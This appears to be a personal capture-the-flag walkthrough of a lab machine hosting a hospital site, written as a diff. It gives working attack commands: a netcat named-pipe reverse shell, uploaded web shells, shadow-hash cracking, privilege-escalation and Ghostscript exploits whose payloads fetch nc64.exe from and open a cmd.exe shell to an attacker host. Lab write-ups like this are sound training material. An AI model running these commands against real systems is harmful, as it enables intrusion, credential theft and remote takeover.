@@ -1,0 +1,30 @@
+nmap -sT -p- --min-rates 5000 <IP>
+#when i run the scan, nmap missed two ports, especially 8080 which was the initial vector. So run nmap 2-3 times
+
+port 8080 hospital management site allows to create and log in as a user.
+
+File upload attack
+
+i uploaded a normal picture first, to see if it get uploaded, it worked. Then i guessed that a /uploads folder might exist, so i tried /upload/picture.jpg and it worked. Utilizing gobuster also found the uploads directory.
+
+Used https://github.com/flozz/p0wny-shell and got a web shell becaused if used normal shell like pentest-monkey it did not work.
+
+Using revshell.com "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.*.* 4444 >/tmp/f" i got a shell in my machine which was a linux machine, the machine itself it a windows so here we have to find another way to get to the windows machine. 
+
+Upon examination, using the "cat /etc/os-release" the Ubuntu 23.04 version is identified. Searching for vulnerabilities, https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629 is found. Using the exploit.sh we get root.
+
+Inspect the contents of /etc/passwd and found a user Drwilliams, check the /etc/shadow for hash, capture it and crack it with john or hashcat
+hashcat <hash file> /usr/share/wordlists/rockyou.txt --show
+
+we the obtained username and password we try to log in to the webmail on port443 which worked.
+Exploring the webmail service, it appears a platform for sending emails. An email is received in the form of an .eps file, which after research such files often leverage Ghostscript for execution.
+
+https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection?source=post_page-----edd713d784bb--------------------------------
+
+python3 CVE_2023_36664_exploit.py --inject --payload "curl 10.10.16.16/nc64.exe -o nc.exe" --filename file.eps after generating the file deliver it via reply to the user. On your web server check that nc was accessed. Then generate this
+python3 CVE_2023_36664_exploit.py --inject --payload "nc.exe 10.10.16.16 4444 -e cmd.exe" --filename file.eps and transfer that too. Meanwhile a listener on the attacking machine has to be opened.
+
+
+There is a ghostscript.bat file along with a password. Attempt to access the rpcclient and use "querydispinfo" to examine the data. Administration Information is shared with the Guest. Attempting to upload a webshell onto the web service for the purpose of investigation the permissions it operates with in xampp\htdocs.
+
+Download on that folder the p0wny shell and get the access to root flag.
